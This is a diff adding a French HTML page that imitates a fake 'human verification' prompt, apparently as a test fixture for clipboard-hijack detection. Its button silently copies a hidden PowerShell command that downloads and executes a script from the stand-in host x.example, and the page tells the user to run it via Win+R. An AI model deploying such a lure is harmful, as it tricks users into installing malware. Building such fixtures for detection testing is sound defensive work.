@@ -1,0 +1,14 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>fausse vérification</title>
+<body>
+<h1>Vérifiez que vous êtes humain</h1>
+<p>Pour terminer, appuyez sur Win+R, collez avec Ctrl+V puis appuyez sur Entrée.</p>
+<button id="marqueur">marqueur</button>
+<button id="verify">Je ne suis pas un robot</button>
+<script>
+  // « marqueur » met du texte neutre dans le presse-papiers : on voit ensuite si la commande l'a remplacé.
+  document.getElementById("marqueur").onclick = () => navigator.clipboard.writeText("marqueur-neutre");
+  document.getElementById("verify").onclick = () =>
+    navigator.clipboard.writeText("powershell -w hidden -c iex (iwr http://x.example/a.ps1)").then(() => (window.__done = true));
+</script>
